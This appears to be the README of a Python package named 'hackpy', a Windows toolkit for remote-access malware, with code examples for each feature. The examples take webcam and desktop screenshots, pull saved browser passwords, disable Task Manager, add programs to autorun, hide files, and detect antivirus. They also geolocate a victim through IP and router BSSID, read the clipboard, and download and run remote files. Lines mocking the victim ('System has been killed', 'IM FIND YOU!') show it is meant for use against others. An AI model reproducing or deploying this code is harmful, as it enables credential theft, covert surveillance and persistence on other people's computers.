![Python](https://www.python.org/static/img/python-logo@2x.png)
# `pip install hackpy` :bomb:

# Example usage:
``` python
# Warning! This module working only on Windows systems!
# Import modules
import os
import hackpy
```

# Get user and system information
![SystemInfo](https://i.ibb.co/b3gmsxg/hackpy-System-Info.png)
``` python
print(
    '\nWelcome to HackPy!\n' +
    '\nUsername: '     + hackpy.userInfo +
    '\nVersion:'       + hackpy.versionInfo +
    '\nRelease: '      + hackpy.releaseInfo +
    '\nSystem: '       + hackpy.systemInfo +
    '\nNode: '         + hackpy.nodeInfo +
    '\nMachine: '      + hackpy.machineInfo +
    '\nProcessor: '    + hackpy.processorInfo +
    '\nPlatform: '     + hackpy.platformInfo +
    '\nArchitecture: ' + hackpy.architectureInfo[0]
    )
```

# Webcam screenshot
``` python
hackpy.webcam(filename = 'screenshot.png', delay = 4500, camera = 1)
```

# Desktop screenshot
``` python
def screenshot(file = 'desktop.png'):
    hackpy.command.nircmdc('savescreenshotfull ' file)

screenshot()
```

# TaskManager
``` python
# If process iexplore.exe found:
if hackpy.taskmanager.find('iexplore.exe') == True:
    # Stop iexplore.exe process
    hackpy.taskmanager.kill('iexplore.exe') 
    # start firefox.exe process
    hackpy.taskmanager.start('firefox.exe')
    
# Return dictonary with all processes
for process in hackpy.taskmanager.list(): 
    print(process)

# Disable windows taskmgr.exe
hackpy.taskmanager.disable()
# Enable windows taskmgr.exe
hackpy.taskmanager.enable() 
```

# Autorun
``` python
# Add cmd.exe to startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = True)

# Remove cmd.exe from startup
hackpy.autorun('C:\\Windows\\System32\\cmd.exe', state = False)
```

# Check if program running as admin
``` python
if (hackpy.isAdmin()): # return True if program started as admin
    print('Program started as admin! Loading cmd.exe')
    status = hackpy.file.startAsAdmin('cmd.exe') # return true in [0] if all is okay and message in [1]
    print('Okay, debugMessage:', status[1])

else:
    print('Program started as user!')
```

# Simple file control
``` python
hackpy.file.exists('file.txt')                # Return True or False
hackpy.file.remove('file.txt')                # Remove file
hackpy.file.rename('file.txt', 'newfile.txt') # Rename file
hackpy.file.copy('file.txt', 'C:\\Windows')   # Copy file
hackpy.file.scan('C:\\')                      # Return all files in directory
hackpy.file.start('file.txt')                 # Start file 
hackpy.file.startAsAdmin('file.txt')          # Start file as admin
hackpy.file.atributeHidden('file.txt')        # Hide file
hackpy.file.atributeNormal('file.txt')        # Show file
```

# Detect installed antivirus software on computer:
``` python 
data = hackpy.detectProtection()
for antivirus in data:
    print('[!] - Antivirus detected: ' + antivirus + ', install path: ' + data[antivirus])
```

# Information about you IP:
``` python
data = hackpy.whois()
print('[?] - You IP is: ' + data['query'])
print('[?] - You live in: ' + data['country'] + ', country code: ' + data['countryCode'])
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as", "local"}

# Information about other IP:
data = hackpy.whois('216.58.215.110')
print('[?] - Other Information about IP:\n' + str(data))
# Return dict: {"query", "status", "country", "countryCode", "region", "regionName", "city", "zip", "lat", "lon", "timezone", "isp", "org", "as"}

# Get geodata about you IP:
data = hackpy.geoplugin()
print('[?] - Latitude: ' + data['geoplugin_latitude'])
# Return dict: {"geoplugin_request", "geoplugin_status", "geoplugin_delay", "geoplugin_credit", "geoplugin_city", "geoplugin_region", "geoplugin_regionCode", "geoplugin_regionName", "geoplugin_areaCode", "geoplugin_dmaCode", "geoplugin_countryCode", "geoplugin_countryName", "geoplugin_inEU", "geoplugin_euVATrate", "geoplugin_continentCode", "geoplugin_continentName", "geoplugin_latitude", "geoplugin_longitude", "geoplugin_locationAccuracyRadius", "geoplugin_timezone", "geoplugin_currencyCode", "geoplugin_currencySymbol", "geoplugin_currencySymbol_UTF8", "geoplugin_currencyConverter"}
```

# Sleep
``` python
hackpy.sleep(5) # Wait 5 secounds
```

# Get router bssid:
``` python
# Get router BSSID
bssid_string = hackpy.router()
# Find LATITUDE and LONGITUDE with router BSSID:
data = hackpy.bssid_locate(bssid_string)
print(
    'RANGE     : ' + str(data['range']) + '\n' +
    'LATITUDE  : ' + str(data['lat'])   + '\n' +
    'LONGITUDE : ' + str(data['lon'])   + '\n'
    )
```

# Windows messagebox:
``` python
# MessageBox types: none, info, question, warning, error 
hackpy.messagebox('error', 'LOL', 'System has been killed :D')
```

# Change desktop wallpaper:
```python 
image = 'C:\\users\\Admin\\wallpaper.png'
hackpy.setWallpaper(image) # BETA
```

# Nircmdc commands
![SITE](https://i.ibb.co/znRLN0D/image.png)
``` python
# You can run nircmdc commands in python
hackpy.command.nircmdc('monitor off')
hackpy.command.nircmdc('speak text \"HAHAHAHAHHAH IM FIND YOU!\"')
# Nircmdc reference: https://nircmd.nirsoft.net
```

# System commands
``` python
hackpy.command.system('shutdown -s -t 260')
```

# Passwords recovery
![SITE](https://i.ibb.co/nnjYFxV/hackpy-passwords-Recovery.png)
``` python
for key, account in hackpy.passwordsRecovery().items():
    print(
        '\n['  + str(key) + ']'
        '\n|____ site: ' + account['url'] + 
        '\n |___ user: ' + account['login'] + 
        '\n  |__ pass: ' + account['password']
        )
```

# SendKeyPress:
``` python
hackpy.sendKey('Hello bro{ENTER}')
# Other keys: https://pastebin.com/Ns3P7UiH
```

# Clipboard
``` python
# Get text from clipboard:
data = hackpy.clipboard.get()
print('Text in clipboard is ' + data)
# Set text to clipboard:
hackpy.clipboard.set('Hello from LimerBoy and HackPy!!')
```

# Download python and install it:
``` python
# Check if python installed on system. False - not installed, True - installed.
if hackpy.checkPython() == False: 
    print('Python is not installed, trying to install!')
    # Default version is 3.7.0 and install path is C:\python37
    hackpy.installPython('3.6.0', path = 'C:\\python36') 
else:
    print('Python is installed!')
```

# Load and run file from internet
``` python
# Download file
file = hackpy.wget(url)
# Start file
os.startfile(file)
```

# Get active window
``` python
window = hackpy.getActiveWindow() # return active window
print('You active window is: ' + window)
```

# Power
``` python
hackpy.power.reboot()     # Reboot
hackpy.power.shutdown()   # Shutdown
hackpy.power.logoff()     # Logoff
hackpy.power.hibernate()  # Hibernate
```

# Get cursor position
``` python
position = hackpy.getCursorPos() # return cursor position
print(
    'You cursor position is: ' +  
    '\nX: ' + str(position[0]) + 
    '\nY: ' + str(position[1])
    )

hackpy.setCursorPos(100, 500) # x, y | BETA
```

